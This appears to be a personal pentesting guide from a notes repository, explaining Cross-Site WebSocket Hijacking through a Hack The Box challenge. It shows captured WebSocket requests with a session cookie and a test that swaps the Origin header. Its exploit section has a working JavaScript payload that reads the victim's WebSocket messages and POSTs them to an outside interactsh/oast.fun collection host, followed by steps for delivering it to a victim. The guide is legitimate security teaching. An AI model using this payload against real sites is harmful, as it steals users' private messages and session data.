This is basically same as a CSRF but leveraged over a Websocket connection instead. I won't go into detailts about how a CSRF works as it is well explained into other guides in my repository.

# How to identify?
We can take as example a header from a WS communication grabbed in Burpsuite:
```
GET /messages HTTP/1.1
Host: 172.17.0.2:80
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Upgrade: websocket
Origin: http://172.17.0.2:80
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZEQwlQ.ZoJ2yDD1Ujx5wzp54vXWN97j1LM
Sec-WebSocket-Key: tVXWWL8gHBYaiixIRZvehw==
```
As you see here there is a cookie session from the authorized user which holds effectively the login, we have the host pointing to **172.x.x.x.** and lastly we have the MOST important **ORIGIN** header which denotes the **SameSite** protection and tells from where the connection is originated from...

We would call CSWH successfully if upon changing the Origin header the communication would still succeed! This effectively represent a cross-site request made from different origins.
We changed Origin to crossdomain.htb as is a domain accessible to us!
```
GET /messages HTTP/1.1
Host: 172.17.0.2:80
Connection: Upgrade
Upgrade: websocket
Origin: http://crossdomain.htb
Sec-WebSocket-Version: 13
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZEQwlQ.ZoJ2yDD1Ujx5wzp54vXWN97j1LM
Sec-WebSocket-Key: 7QpTshdCiQfiv3tH7myJ1g==
```


# How to exploit
If we found that CS Request works and is possible then we would need to follow those steps to execute a proper ex-filtration and grab users cookie:
1)Setup a ex-filtration server example: https://app.interactsh.com/#/
2)Prepare our ex-filtration JS code (need to be adapted to your needs as this one is only specific for a HTB challenge, point to your interactsh into fetch line for exfil)
```
<script>
  function send_message(event){
    socket.send('!get_messages');
  };
  const socket = new WebSocket('ws://172.17.0.2:80/messages');
  socket.onopen = send_message;
  socket.addEventListener('message', ev => {
    fetch('http://ch23a202vtc0000138p0getbibyyyyyyb.oast.fun/', {method: 'POST', mode: 'no-cors', body: ev.data});
  });
</script>

```
3)Host it on your machine via Web-server
4)Deliver the payload to the victim
5)The victim will visit our rogue **httpserver** where will fetch our rogue JS code that will ex-filtrate data from admin session.

OBS: to make this work the **SameSite** cookie get back as a response from the web-socket back-end MUST be set as **SameSite:None** otherwise will not work. By default if not specified we know that **SameSite** will be set as **LAX** by default browsers where cookie will only transit in get request and not JS code which makes this attack ineffective.